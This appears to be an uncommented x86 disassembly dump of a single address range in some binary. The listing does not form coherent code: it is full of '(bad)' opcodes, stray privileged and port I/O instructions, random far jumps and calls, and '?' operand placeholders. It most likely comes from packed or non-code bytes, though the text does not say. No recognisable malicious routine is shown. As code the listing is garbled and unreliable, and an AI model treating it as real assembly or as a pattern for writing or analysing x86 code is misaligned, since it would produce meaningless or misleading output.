  40e7f4:	shr    ebx,0xca
  40e7f7:	jmp    FWORD PTR [esi-0x33db2f0b]
  40e7fd:	or     BYTE PTR [esi-0xd],bl
  40e800:	jns    0x40e7b2
  40e802:	add    dl,al
  40e804:	popa   
  40e805:	jno    0x40e874
  40e807:	ins    BYTE PTR es:[edi],dx
  40e808:	mov    ebp,0xb73f021e
  40e80d:	inc    ecx
  40e80e:	int    0xb0
  40e810:	bound  ebx,QWORD PTR [eax]
  40e812:	test   eax,0x6e211275
  40e817:	mov    bl,0xec
  40e819:	addr16 inc esp
  40e81b:	jne    0x4b0f2feb
  40e821:	std    
  40e822:	mov    ah,0xd
  40e824:	jmp    0x40e865
  40e826:	mov    edx,0xfefae161
  40e82b:	mov    ebx,0xffd174e9
  40e830:	fild   DWORD PTR [ecx]
  40e832:	and    ebx,esp
  40e834:	sbb    eax,0xa5433022
  40e839:	shr    BYTE PTR [ebx],cl
  40e83b:	fistp  DWORD PTR ds:0xefc3ac0e
  40e841:	push   DWORD PTR [eax+eiz*8-0x79]
  40e845:	ss jno 0x40e7e8
  40e848:	or     ebx,0x5f
  40e84b:	push   ss
  40e84c:	xor    al,0x9
  40e84e:	xor    cl,dh
  40e850:	dec    esi
  40e851:	bound  esi,QWORD PTR [eax+0x4ba9cbee]
  40e857:	dec    edx
  40e858:	pop    ebp
  40e859:	push   ebp
  40e85a:	mov    ecx,0x256e76a2
  40e85f:	out    dx,eax
  40e860:	stos   DWORD PTR es:[edi],eax
  40e861:	mov    dx,0xf5e5
  40e865:	aam    0x1
  40e867:	add    ch,BYTE PTR [edx]
  40e869:	cmp    BYTE PTR [esi+0x54e485c0],bl
  40e86f:	ret    
  40e870:	cmp    al,0x8
  40e872:	mov    esp,0x517dc8ff
  40e877:	enter  0xa689,0xd7
  40e87b:	push   ss
  40e87c:	shl    DWORD PTR [eax+edx*4-0x5d736a90],cl
  40e883:	and    BYTE PTR [ebx],0x34
  40e886:	push   edi
  40e887:	pop    edi
  40e888:	data16 arpl WORD PTR [edi],si
  40e88b:	test   eax,0xa0c17c65
  40e890:	pop    edx
  40e891:	vprotw ymm0,xmm4,xmm6
  40e896:	add    DWORD PTR [ebx+0x1784efdd],ebp
  40e89c:	dec    esi
  40e89d:	mov    es,WORD PTR [edx-0x35]
  40e8a0:	cli    
  40e8a1:	xchg   DWORD PTR [ecx-0x7bf8f2d0],esp
  40e8a7:	mov    edi,esi
  40e8a9:	repnz adc bh,BYTE PTR [esi-0x8]
  40e8ad:	cmp    BYTE PTR [eax+0x74],al
  40e8b0:	inc    esp
  40e8b1:	push   es
  40e8b2:	sbb    ecx,0x495f6d41
  40e8b8:	add    ebx,DWORD PTR [ebx]
  40e8ba:	mov    DWORD PTR [esi+0x9],edi
  40e8bd:	or     eax,0xc199efe7
  40e8c2:	push   eax
  40e8c3:	aas    
  40e8c4:	psllw  mm0,mm5
  40e8c7:	mov    BYTE PTR [esi+esi*8-0x6a41063b],ah
  40e8ce:	inc    ebp
  40e8cf:	mov    eax,0xa354991f
  40e8d4:	inc    edi
  40e8d5:	retf   0x1c2f
  40e8d8:	sub    DWORD PTR [ebx-0x4b2f7ef1],ebx
  40e8de:	icebp  
  40e8df:	pusha  
  40e8e0:	cdq    
  40e8e1:	or     esi,DWORD PTR [eax-0x72]
  40e8e4:	push   eax
  40e8e5:	adc    edx,DWORD PTR [ecx+edx*1-0x7c]
  40e8e9:	call   0x67a88dd5
  40e8ee:	ret    0x5c46
  40e8f1:	ret    
  40e8f2:	clc    
  40e8f3:	sbb    ebp,esi
  40e8f5:	push   ebp
  40e8f6:	pop    ebx
  40e8f7:	dec    ebp
  40e8f8:	xchg   BYTE PTR [ecx],bh
  40e8fa:	and    eax,0xd280bb4d
  40e8ff:	jno    0x40e924
  40e901:	jno    0x40e905
  40e903:	lock loop 0x40e973
  40e906:	mov    bh,0xf6
  40e908:	in     al,dx
  40e909:	and    BYTE PTR [ecx],ah
  40e90b:	inc    esi
  40e90c:	test   BYTE PTR [ecx+0xa],ch
  40e90f:	pop    ss
  40e910:	cmp    eax,DWORD PTR [edx-0x3f0b0296]
  40e916:	punpcklbw mm4,DWORD PTR [edi+ebp*1+0x7]
  40e91b:	je     0x40e8ca
  40e91d:	rol    al,1
  40e91f:	jg     0x40e90d
  40e921:	sub    DWORD PTR [eax+0x1],esi
  40e924:	cld    
  40e925:	enter  0x786e,0xd7
  40e929:	push   ebx
  40e92a:	mov    ah,0x6d
  40e92c:	adc    al,0x32
  40e92e:	add    eax,0x1180e13e
  40e933:	and    edx,DWORD PTR [ebx+0x44ac3d57]
  40e939:	je     0x40e90c
  40e93b:	xlat   BYTE PTR ds:[ebx]
  40e93c:	stos   DWORD PTR es:[edi],eax
  40e93d:	out    0x71,al
  40e93f:	int3   
  40e940:	sti    
  40e941:	popa   
  40e942:	stc    
  40e943:	nop
  40e944:	cmp    BYTE PTR [ebx-0x22c1e0b6],ch
  40e94a:	mov    DWORD PTR [eax+ecx*4+0x56],esp
  40e94e:	dec    edx
  40e94f:	cmp    ch,ah
  40e951:	adc    edx,edx
  40e953:	cmp    bl,BYTE PTR [edi-0x7cc53366]
  40e959:	dec    edi
  40e95a:	(bad)  
  40e95b:	aas    
  40e95c:	retf   
  40e95d:	mov    al,ds:0x83a8e13
  40e962:	retf   
  40e963:	mov    ds:0x84430e6,al
  40e968:	clc    
  40e969:	hlt    
  40e96a:	aam    0x1b
  40e96c:	and    DWORD PTR [edx],0xfffffff7
  40e96f:	bound  esp,QWORD PTR [edi+edi*2-0x25]
  40e973:	addr16 jo 0x40e9e1
  40e976:	push   ss
  40e977:	(bad)  
  40e978:	and    BYTE PTR [ecx+0x193a7454],al
  40e97e:	xchg   edx,eax
  40e97f:	sbb    BYTE PTR [eax],cl
  40e981:	dec    ebx
  40e982:	jb     0x40e914
  40e984:	dec    ebp
  40e985:	call   0x5d90:0xf6d6eb2d
  40e98c:	in     al,0xd
  40e98e:	jne    0x40e916
  40e990:	aad    0x24
  40e992:	bound  ebp,QWORD PTR [esi+0x2e]
  40e995:	neg    DWORD PTR [ecx-0x140b2d25]
  40e99b:	mov    esi,0x6cb9e38b
  40e9a0:	pslld  mm3,0x3d
  40e9a4:	int    0x47
  40e9a6:	sbb    BYTE PTR [eax+ecx*8],dh
  40e9a9:	fnstcw WORD PTR [eax-0x51]
  40e9ac:	outs   dx,DWORD PTR ds:[esi]
  40e9ad:	call   0x9cc59ea4
  40e9b2:	into   
  40e9b3:	dec    ebx
  40e9b4:	in     al,dx
  40e9b5:	(bad)  
  40e9b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e9b7:	lds    eax,FWORD PTR [esi]
  40e9b9:	xor    BYTE PTR [ecx+0x629799b6],al
  40e9bf:	adc    edx,ebp
  40e9c1:	cmp    edx,ecx
  40e9c3:	stc    
  40e9c4:	push   cs
  40e9c5:	mov    ecx,0x1b384ea1
  40e9ca:	das    
  40e9cb:	loopne 0x40ea46
  40e9cd:	(bad)  
  40e9ce:	jnp    0x40e95a
  40e9d0:	mov    dl,0x58
  40e9d2:	stos   DWORD PTR es:[edi],eax
  40e9d3:	test   BYTE PTR [ecx-0x18],bl
  40e9d6:	pusha  
  40e9d7:	pushf  
  40e9d8:	pop    ss
  40e9d9:	mov    BYTE PTR [edx+0x1e],ah
  40e9dc:	mov    esp,0x334c153d
  40e9e1:	mov    ecx,?
  40e9e3:	mov    edi,0x63a08d8a
  40e9e8:	pop    ecx
  40e9e9:	dec    esp
  40e9ea:	(bad)  [eax+0x3c]
  40e9ed:	cmp    al,0x7
  40e9ef:	rcl    DWORD PTR [ecx-0x1e],1
  40e9f2:	xchg   esp,eax
  40e9f3:	out    0x45,eax
  40e9f5:	xchg   ecx,eax
  40e9f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f7:	inc    edi
  40e9f8:	fstp   TBYTE PTR [edx+0x60e3195a]
  40e9fe:	enter  0x1a6c,0x53
  40ea02:	pop    esp
  40ea03:	daa    
  40ea04:	xchg   edx,eax
  40ea05:	mov    ah,0x7d
  40ea07:	(bad)  [ebp+0x7a]
  40ea0a:	repz or bh,cl
  40ea0d:	or     al,BYTE PTR [eax+0x15ec2998]
  40ea13:	mov    eax,0x82c2d57d
  40ea18:	fld    TBYTE PTR [edi+0x553d60d7]
  40ea1e:	mov    bh,0xf8
  40ea20:	into   
  40ea21:	shl    BYTE PTR [ecx+0x4826c137],1
  40ea27:	scas   eax,DWORD PTR es:[edi]
  40ea28:	clc    
  40ea29:	stc    
  40ea2a:	inc    edi
  40ea2b:	or     ebx,esp
  40ea2d:	dec    edx
  40ea2e:	fsub   DWORD PTR [edx-0x60]
  40ea31:	in     al,dx
  40ea32:	(bad)  
  40ea33:	in     al,0x85
  40ea35:	std    
  40ea36:	and    ebx,DWORD PTR [edi]
  40ea38:	jo     0x40ea4b
  40ea3a:	dec    ebx
  40ea3b:	loopne 0x40ea54
  40ea3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ea3e:	cli    
  40ea3f:	ds jmp 0x9e120ae0
  40ea45:	cmp    BYTE PTR [esi+0x4e7ebed],cl
  40ea4b:	and    BYTE PTR [ebp+0x50],bh
  40ea4e:	sti    
  40ea4f:	les    esi,FWORD PTR [ecx+ebx*1+0xb]
  40ea53:	sbb    ecx,DWORD PTR [ecx+0x1ac65751]
  40ea59:	jo     0x40ea98
  40ea5b:	and    edx,edi
  40ea5d:	pop    ss
  40ea5e:	out    0x32,eax
  40ea60:	cs out 0x48,al
  40ea63:	mov    ebp,0xa81a830d
  40ea68:	in     eax,dx
  40ea69:	adc    DWORD PTR ds:0xcd79108f,ebx
  40ea6f:	(bad)  
  40ea70:	mov    ebx,0x38f5a1dd
  40ea75:	dec    edx
  40ea76:	daa    
  40ea77:	out    0xff,al
  40ea79:	adc    BYTE PTR [eax-0x4c23fbdf],bl
  40ea7f:	cmp    eax,0x3a72f52d
  40ea84:	call   0x1eabe65d
  40ea89:	inc    edx
  40ea8a:	mov    bl,0x76
  40ea8c:	das    
  40ea8d:	fisubr DWORD PTR [eax-0x23a87af9]
  40ea93:	test   eax,0xc1d21e0a
  40ea98:	retf   
  40ea99:	into   
  40ea9a:	xchg   edi,eax
  40ea9b:	push   edx
  40ea9c:	shl    DWORD PTR [edi+edi*8],1
  40ea9f:	xor    bl,BYTE PTR [esp+edx*8]
  40eaa2:	in     al,dx
  40eaa3:	push   0x48
  40eaa5:	addr16 shl edx,cl
  40eaa8:	out    dx,eax
  40eaa9:	hlt    
  40eaaa:	ret    0x7d98
  40eaad:	pop    es
  40eaae:	cld    
  40eaaf:	cmp    bh,BYTE PTR [eax+0x6957bb79]
  40eab5:	mov    ebp,0x921f375d
  40eaba:	sub    ecx,esi
  40eabc:	iret   
  40eabd:	arpl   WORD PTR [ebx-0x74667e65],dx
  40eac3:	pop    es
  40eac4:	dec    ebp
  40eac5:	cli    
  40eac6:	and    bl,bh
  40eac8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eac9:	int    0x80
  40eacb:	(bad)  
  40eacc:	or     ebp,DWORD PTR [ebx+ebx*1-0x4b5b9eef]
  40ead3:	sbb    DWORD PTR [ebx-0x48],esp
  40ead6:	mov    WORD PTR [ebx-0x15ba8e82],ss
  40eadc:	dec    ecx
  40eadd:	xor    ecx,DWORD PTR [edx-0x10]
  40eae0:	hlt    
  40eae1:	nop
  40eae2:	mov    edx,0x26a9344
  40eae7:	popf   
  40eae8:	ds add eax,0x7663af2a
  40eaee:	xchg   dh,bh
  40eaf0:	arpl   WORD PTR [esi],si
  40eaf2:	fld    DWORD PTR [edx+0x60021b0b]
  40eaf8:	inc    eax
  40eaf9:	sar    DWORD PTR fs:[eax+edx*8+0x63],0x0
  40eaff:	pop    es
  40eb00:	cmp    DWORD PTR [eax+0x70],ebx
  40eb03:	adc    ebx,edi
  40eb05:	nop
  40eb06:	mov    BYTE PTR [esi+0x730327b8],cl
  40eb0c:	sbb    edi,ebx
  40eb0e:	adc    al,0x28
  40eb10:	sub    dl,al
  40eb12:	pop    edi
  40eb13:	jno    0x40eaab
  40eb15:	jb     0x40ead1
  40eb17:	mov    ebx,DWORD PTR [eax-0x50]
  40eb1a:	(bad)  
  40eb1b:	out    dx,eax
  40eb1c:	not    DWORD PTR [esi]
  40eb1e:	sbb    edi,edx
  40eb20:	repz cdq 
  40eb22:	dec    ebp
  40eb23:	repnz rcr DWORD PTR [eax],1
  40eb26:	add    dh,BYTE PTR ds:0xb9284ebc
  40eb2c:	popa   
  40eb2d:	fld    TBYTE PTR [ecx+0x40df751a]
  40eb33:	repnz push ds
  40eb35:	or     dh,0x3b
  40eb38:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb39:	jl     0x40eb01
  40eb3b:	fmul   st(2),st
  40eb3d:	jecxz  0x40ebbe
  40eb3f:	push   es
  40eb40:	cmp    eax,0xee1f16b0
  40eb45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb46:	push   0x92fb084a
  40eb4b:	lods   al,BYTE PTR ds:[esi]
  40eb4c:	popa   
  40eb4d:	or     DWORD PTR fs:[eax+esi*4+0x509f2b25],edx
  40eb55:	in     eax,dx
  40eb56:	pop    esp
  40eb57:	jmp    0x78b0:0xfec31446
  40eb5e:	fs gs iret 
  40eb61:	inc    ecx
  40eb62:	mov    esp,0xe5ecd80c
  40eb67:	push   edi
  40eb68:	xchg   ebp,eax
  40eb69:	lahf   
  40eb6a:	inc    ecx
  40eb6b:	in     al,dx
  40eb6c:	bound  edi,QWORD PTR fs:[ebp+ebp*1+0x1e]
  40eb71:	leave  
  40eb72:	sti    
  40eb73:	mov    esi,0xfb47ef50
  40eb78:	mov    ah,bl
  40eb7a:	mov    eax,ss:0x134223fa
  40eb80:	jl     0x40eb59
  40eb82:	rcl    DWORD PTR [ecx+0x60558d8a],cl
  40eb88:	mov    dl,0x9f
  40eb8a:	imul   ecx,DWORD PTR [esi+edi*1+0x17],0x2b
  40eb8f:	cmp    al,0x42
  40eb91:	xor    ah,BYTE PTR [ebx-0x3d]
  40eb94:	je     0x40eb6f
  40eb96:	cmp    eax,0x29d36ca0
  40eb9b:	add    BYTE PTR [edx+0x34],0xbd
  40eb9f:	mov    WORD PTR [esi+0x39],ax
  40eba3:	push   es
  40eba4:	pop    es
  40eba5:	fdivp  st(2),st
  40eba7:	sbb    DWORD PTR [ebx],ebx
  40eba9:	ins    BYTE PTR es:[edi],dx
  40ebaa:	xor    eax,0xefcad0e7
  40ebaf:	mov    dh,0x3c
  40ebb1:	dec    esi
  40ebb2:	jg     0x40ebc7
  40ebb4:	(bad)  
  40ebb5:	imul   esp
  40ebb7:	aas    
  40ebb8:	addr16 leave 
  40ebba:	dec    esi
  40ebbb:	or     eax,0xc9cbb80c
  40ebc0:	fimul  DWORD PTR [eax-0x5c7a8894]
  40ebc6:	sbb    DWORD PTR [ebp-0x1d],ecx
  40ebc9:	bound  esi,QWORD PTR [edx]
  40ebcb:	dec    eax
  40ebcc:	fs adc al,0x2c
  40ebcf:	xlat   BYTE PTR ds:[ebx]
  40ebd0:	push   ecx
  40ebd1:	cwde   
  40ebd2:	xor    DWORD PTR [eax],0xffffffc2
  40ebd5:	push   ss
  40ebd6:	dec    edi
  40ebd7:	jle    0x40ec4b
  40ebd9:	xor    al,0x13
  40ebdb:	mov    al,ds:0xb02b2907
  40ebe0:	push   esp
  40ebe1:	(bad)  
  40ebe2:	(bad)  
  40ebe3:	lods   eax,DWORD PTR ds:[esi]
  40ebe4:	xor    eax,0x67c3fb92
  40ebe9:	pop    edi
  40ebea:	mov    ch,0xe
  40ebec:	mov    BYTE PTR [edx+0x3d],dh
  40ebef:	dec    edi
  40ebf0:	aaa    
  40ebf1:	jle    0x40ebc9
  40ebf3:	pop    es
  40ebf4:	sub    dl,BYTE PTR [esi+0x72e86d08]
  40ebfa:	push   0xabac31bb
  40ebff:	fstp   DWORD PTR [edx-0x1a]
  40ec02:	xor    BYTE PTR [edi],al
  40ec04:	ret    0xfc9a
  40ec07:	dec    esi
  40ec08:	cmp    DWORD PTR [eax],0xf4330d
  40ec0e:	into   
  40ec0f:	bound  edx,QWORD PTR [ecx+0x20]
  40ec12:	loop   0x40ec33
  40ec14:	xor    bh,bl
  40ec16:	adc    esp,DWORD PTR [ecx-0x7824a22a]
  40ec1c:	cmp    BYTE PTR [eax+0xb0ad2d],0x7c
  40ec23:	ret    
  40ec24:	and    al,BYTE PTR [ebx]
  40ec26:	icebp  
  40ec27:	or     BYTE PTR [ebx+ebp*2-0x5bcaa0af],bh
  40ec2e:	sbb    al,cl
  40ec30:	sbb    BYTE PTR [eax-0x570dfb35],dl
  40ec36:	lfs    edx,FWORD PTR [edi-0xf]
  40ec3a:	jnp    0x40ebc6
  40ec3c:	pushf  
  40ec3d:	sbb    eax,0x29d6f1f7
  40ec42:	es lock xchg edx,eax
  40ec45:	mov    ch,0x67
  40ec47:	jbe    0x40ec07
  40ec49:	jecxz  0x40ec15
  40ec4b:	mov    DWORD PTR [eax+0x2a],ebx
  40ec4e:	mov    WORD PTR [esi],?
  40ec50:	dec    eax
  40ec51:	das    
  40ec52:	dec    esi
  40ec53:	(bad)  
  40ec54:	call   0x874:0xb7c6b6ab
  40ec5b:	test   al,0xc7
  40ec5d:	cdq    
  40ec5e:	rol    BYTE PTR [ecx*2-0x504ea3c9],cl
  40ec65:	ds mov cl,0x63
  40ec68:	add    BYTE PTR [esi],0x7a
  40ec6b:	scas   al,BYTE PTR es:[edi]
  40ec6c:	mov    eax,0xc472901f
  40ec71:	sub    al,0x6f
  40ec73:	mov    dl,0xf8
  40ec75:	test   DWORD PTR [ebp-0x67],0x64ed631b
  40ec7c:	aaa    
  40ec7d:	outs   dx,DWORD PTR ds:[esi]
  40ec7e:	dec    edx
  40ec7f:	inc    esi
  40ec80:	ficomp DWORD PTR [ecx-0x591ad619]
  40ec86:	pop    ss
  40ec87:	cld    
  40ec88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ec89:	and    eax,DWORD PTR [ecx]
  40ec8b:	inc    ebp
  40ec8c:	push   cs
  40ec8d:	sahf   
  40ec8e:	inc    esp
  40ec8f:	push   eax
  40ec90:	sti    
  40ec91:	sub    DWORD PTR [edi+0x5d94912],ecx
  40ec97:	or     al,0xe3
  40ec99:	fisubr DWORD PTR [ebp+0x9]
  40ec9c:	add    al,0xd9
  40ec9e:	sbb    dh,BYTE PTR [edx]
  40eca0:	loopne 0x40ed09
  40eca2:	xchg   ebx,eax
  40eca3:	mov    fs:0xea82604,eax
  40eca9:	fs retf 
  40ecab:	pop    eax
  40ecac:	push   es
  40ecad:	enter  0x4ef4,0xeb
  40ecb1:	pop    edx
  40ecb2:	pop    ebp
  40ecb3:	sbb    al,BYTE PTR [edx]
  40ecb5:	push   ebp
  40ecb6:	adc    eax,0x5edc1a8a
  40ecbb:	aad    0xa5
  40ecbd:	pop    edx
  40ecbe:	test   dl,al
  40ecc0:	push   ds
  40ecc1:	or     al,0x56
  40ecc3:	adc    BYTE PTR [edi+0x13],ch
  40ecc6:	in     al,dx
  40ecc7:	in     eax,0x20
  40ecc9:	push   edx
  40ecca:	dec    edx
  40eccb:	jle    0x40ec8d
  40eccd:	ret    
  40ecce:	out    dx,eax
  40eccf:	pop    ecx
  40ecd0:	pop    ss
  40ecd1:	les    ebx,FWORD PTR [ecx-0x33905e92]
  40ecd7:	push   0xfffffff6
  40ecd9:	ret    
  40ecda:	and    DWORD PTR [edx+0x6e],ecx
  40ecdd:	ret    
  40ecde:	dec    ecx
  40ecdf:	in     al,0x9
  40ece1:	sbb    BYTE PTR [edi-0x56],dh
  40ece4:	xchg   ebp,eax
  40ece5:	ret    0x96d7
  40ece8:	outs   dx,BYTE PTR ds:[esi]
  40ece9:	add    BYTE PTR [ebp+0x7a90176],bl
  40ecef:	dec    eax
  40ecf0:	into   
  40ecf1:	or     al,dh
  40ecf3:	sti    
  40ecf4:	into   
  40ecf5:	stc    
  40ecf6:	in     al,dx
  40ecf7:	adc    DWORD PTR [edx],eax
  40ecf9:	mov    esp,0xcce9f9b3
  40ecfe:	inc    ecx
  40ecff:	pop    ss
  40ed00:	mov    WORD PTR [eax-0x6d],?
  40ed03:	or     DWORD PTR [edi+eax*8-0x159df8ea],0x40
  40ed0b:	push   es
  40ed0c:	mov    bl,0x8e
  40ed0e:	clc    
  40ed0f:	jnp    0x40eca4
  40ed11:	shld   edx,edx,cl
  40ed14:	mov    ds:0x7576d0e4,eax
  40ed19:	fsubr  QWORD PTR ds:0x4f194d29
  40ed1f:	xchg   esi,eax
  40ed20:	mov    ch,0xa6
  40ed22:	jle    0x40ed8b
  40ed24:	sahf   
  40ed25:	shl    BYTE PTR [edx+0x59],1
  40ed28:	mov    BYTE PTR [ebp+0x3f6bb2c4],bh
  40ed2e:	push   0x48
  40ed30:	test   eax,0xeead1316
  40ed35:	stos   DWORD PTR es:[edi],eax
  40ed36:	push   ecx
  40ed37:	inc    eax
  40ed38:	jecxz  0x40ecbf
  40ed3a:	int3   
  40ed3b:	ret    
  40ed3c:	std    
  40ed3d:	retf   
  40ed3e:	shl    BYTE PTR ds:0xd5111fba,0x6c
  40ed45:	mov    dh,0x21
  40ed47:	sub    BYTE PTR [esi+0x1b9d147e],ah
  40ed4d:	mov    WORD PTR [ebx],ds
  40ed4f:	cmp    al,0xf1
  40ed51:	mov    ebp,0xc06f1644
  40ed56:	and    al,0xfb
  40ed58:	mov    edx,0x120c7410
  40ed5d:	popa   
  40ed5e:	in     eax,0x5c
  40ed60:	inc    edx
  40ed61:	ja     0x40ed5a
  40ed63:	mov    bh,0x6e
  40ed65:	nop    DWORD PTR [eax-0x49]
  40ed69:	cmp    al,0x2e
  40ed6b:	adc    DWORD PTR ds:0x85b53003,0x3e081aeb
  40ed75:	scas   al,BYTE PTR es:[edi]
  40ed76:	inc    edi
  40ed77:	sbb    edi,DWORD PTR [ecx]
  40ed79:	mov    ah,0x30
  40ed7b:	data16 mov cl,BYTE PTR [esi+edx*1-0x1271fbde]
  40ed83:	xchg   edx,eax
  40ed84:	imul   esp,edi,0x950c14d3
  40ed8a:	sbb    ah,dh
  40ed8c:	mov    ecx,0xff9b8292
  40ed91:	cmp    BYTE PTR [eax+0x8],cl
  40ed94:	add    eax,0x5b807288
  40ed99:	and    al,0xbe
  40ed9b:	and    ch,BYTE PTR [ebp+0x31]
  40ed9e:	inc    esi
  40ed9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eda0:	into   
  40eda1:	js     0x40ee1c
  40eda3:	push   ebp
  40eda4:	dec    esi
  40eda5:	shl    BYTE PTR [eax],cl
  40eda7:	in     eax,dx
  40eda8:	pusha  
  40eda9:	fsubr  QWORD PTR [edi]
  40edab:	in     eax,0x9a
  40edad:	inc    esi
  40edae:	(bad)  
  40edaf:	inc    esi
  40edb0:	call   DWORD PTR [ecx-0x54e8a50e]
  40edb6:	xchg   esi,eax
  40edb7:	test   al,0x4a
  40edb9:	xor    ch,ch
  40edbb:	sbb    BYTE PTR [esi+eiz*1-0x50],al
  40edbf:	sar    BYTE PTR [esi],cl
  40edc1:	ss clc 
  40edc3:	ret    
  40edc4:	mov    ss,WORD PTR [edx-0x31671cb3]
  40edca:	retf   0x5399
  40edcd:	push   eax
  40edce:	sub    eax,0xf564d908
  40edd3:	mov    DWORD PTR [edi+0x32],ebx
  40edd6:	cmp    eax,0xbddd316
  40eddb:	neg    BYTE PTR [ebp-0x69f80c23]
  40ede1:	sub    eax,0x5db0ba29
  40ede6:	(bad)  
  40ede7:	jbe    0x40ee08
  40ede9:	mov    cl,BYTE PTR ds:0x381be23c
  40edef:	mov    eax,ds:0xb4aa7daf
  40edf4:	jae    0x40ee51
  40edf6:	jecxz  0x40ed87
  40edf8:	jmp    0x70a9:0xe807f987
  40edff:	(bad)  
  40ee00:	and    eax,0x1b3c0a98
  40ee05:	pop    ebx
  40ee06:	dec    esi
  40ee07:	scas   eax,DWORD PTR es:[edi]
  40ee08:	mov    ebx,0xf8287692
  40ee0d:	shl    ebx,cl
  40ee0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ee10:	jbe    0x40edf7
  40ee12:	sub    al,0xbd
  40ee14:	gs lahf 
  40ee16:	sub    bl,BYTE PTR [edx+0x1702251c]
  40ee1c:	outs   dx,DWORD PTR ds:[esi]
  40ee1d:	sub    esp,edx
  40ee1f:	xchg   ebx,eax
  40ee20:	xlat   BYTE PTR ds:[ebx]
  40ee21:	(bad)  
  40ee22:	in     eax,0xaf
  40ee24:	fisub  WORD PTR [edx+0x48]
  40ee27:	xchg   BYTE PTR [ebp+ebx*4-0x1c1a9523],dl
  40ee2e:	mov    bl,0x23
  40ee30:	mov    edi,0xd7802ab1
  40ee35:	dec    edi
  40ee36:	and    eax,0xf44898cd
  40ee3b:	xchg   edx,eax
  40ee3c:	pop    DWORD PTR [ebp-0xd2ba33f]
  40ee42:	inc    ecx
  40ee43:	inc    esi
  40ee44:	jo     0x40edf7
  40ee46:	add    al,0x74
  40ee48:	add    eax,0xf397a31d
  40ee4d:	leave  
  40ee4e:	and    al,0xf5
  40ee50:	inc    ebp
  40ee51:	adc    DWORD PTR [ebx],eax
  40ee53:	and    cl,BYTE PTR ds:0xd7d48e42
  40ee59:	dec    ebx
  40ee5a:	dec    DWORD PTR [ebx]
  40ee5c:	mov    bh,0xd2
  40ee5e:	xor    BYTE PTR [esi+0x20470f40],0x8c
  40ee65:	jecxz  0x40ee56
  40ee67:	rol    DWORD PTR [ecx+0x7b],cl
  40ee6a:	sbb    eax,0x921f38be
  40ee6f:	in     al,0x73
  40ee71:	jae    0x40eed1
  40ee73:	inc    ebx
  40ee74:	jl     0x40eee6
  40ee76:	dec    edx
  40ee77:	adc    DWORD PTR [esi+0x1e],edi
  40ee7a:	lods   al,BYTE PTR ds:[esi]
  40ee7b:	xchg   edi,eax
  40ee7c:	adc    ah,BYTE PTR [eax-0x51]
  40ee7f:	loop   0x40ee60
  40ee81:	ficom  WORD PTR [ebx+0x51]
  40ee84:	mov    esi,0x697539c0
  40ee89:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee8a:	fs daa 
  40ee8c:	jns    0x40eef3
  40ee8e:	clc    
  40ee8f:	inc    ecx
  40ee90:	pop    edx
  40ee91:	int    0x21
  40ee93:	pusha  
  40ee94:	mov    ds:0xf5c03eb5,al
  40ee99:	pop    ebp
  40ee9a:	add    eax,0x3083e7c
  40ee9f:	xor    esp,esi
  40eea1:	and    bh,BYTE PTR [eax+0x3ab6d1cc]
  40eea7:	sub    eax,0x61568bbb
  40eeac:	inc    esi
  40eead:	add    dh,al
  40eeaf:	std    
  40eeb0:	aad    0x69
  40eeb2:	fwait
  40eeb3:	and    al,BYTE PTR [esi+0xce1da5f]
  40eeb9:	mov    esi,0xe9c56e2
  40eebe:	push   ds
  40eebf:	push   ss
  40eec0:	(bad)  [edi]
  40eec2:	or     ebx,DWORD PTR [edx]
  40eec4:	mov    eax,0x5eb75c8d
  40eec9:	mov    esp,0xaf38bae2
  40eece:	xlat   BYTE PTR ds:[ebx]
  40eecf:	xchg   bl,al
  40eed1:	call   0x3952:0x6aa7f8c9
  40eed8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40eed9:	and    dh,BYTE PTR [edx]
  40eedb:	xor    edx,DWORD PTR [ebp-0x75a5252e]
  40eee1:	in     al,0xd8
  40eee3:	or     dh,BYTE PTR [ebp-0x1b]
  40eee6:	and    al,0xaa
  40eee8:	dec    edx
  40eee9:	dec    BYTE PTR [eax+0x3032061e]
  40eeef:	loopne 0x40ef67
  40eef1:	das    
  40eef2:	lods   eax,DWORD PTR gs:[esi]
  40eef4:	(bad)  
  40eef5:	rcr    DWORD PTR [ebx-0x4a183200],0x58
  40eefc:	pop    ecx
  40eefd:	enter  0x9d8a,0x8
  40ef01:	int3   
  40ef02:	push   0xafe32c42
  40ef07:	out    0x39,eax
  40ef09:	adc    al,0xa7
  40ef0b:	mov    ?,WORD PTR [edi]
  40ef0d:	js     0x40ef2a
  40ef0f:	pop    ss
  40ef10:	xchg   BYTE PTR es:[edx-0x52234fcf],ch
  40ef17:	jle    0x40ef78
  40ef19:	and    al,0xf3
  40ef1b:	sub    eax,0xfc6d1108
  40ef20:	add    ah,0x3b
  40ef23:	push   ds
  40ef24:	sub    BYTE PTR [esi],dl
  40ef26:	fcomp  QWORD PTR [ebx-0x22]
  40ef29:	dec    ebp
  40ef2a:	mov    ds:0x60356b4a,al
  40ef2f:	lock lahf 
  40ef31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ef32:	imul   BYTE PTR [eax+0x60]
  40ef35:	ds push esi
  40ef37:	test   BYTE PTR [ebp+0x35],0x4b
  40ef3b:	mov    eax,ds:0x61281abf
  40ef40:	push   0x42121054
  40ef45:	mov    cl,0x9
  40ef47:	sti    
  40ef48:	int3   
  40ef49:	inc    ebx
  40ef4a:	sub    esi,DWORD PTR [eax]
  40ef4c:	mov    BYTE PTR [esi],bh
  40ef4e:	loopne 0x40ef32
  40ef50:	mov    eax,ds:0x8e84161d
  40ef55:	mov    ds:0x67d21475,al
  40ef5a:	pop    ebp
  40ef5b:	pop    es
  40ef5c:	scas   al,BYTE PTR es:[edi]
  40ef5d:	mov    cl,0x13
  40ef5f:	push   cs
  40ef60:	stos   BYTE PTR es:[edi],al
  40ef61:	push   ebp
  40ef62:	ss clc 
  40ef64:	lods   eax,DWORD PTR ds:[esi]
  40ef65:	adc    BYTE PTR [ebp+0x59],cl
  40ef68:	sbb    cl,BYTE PTR [ebx]
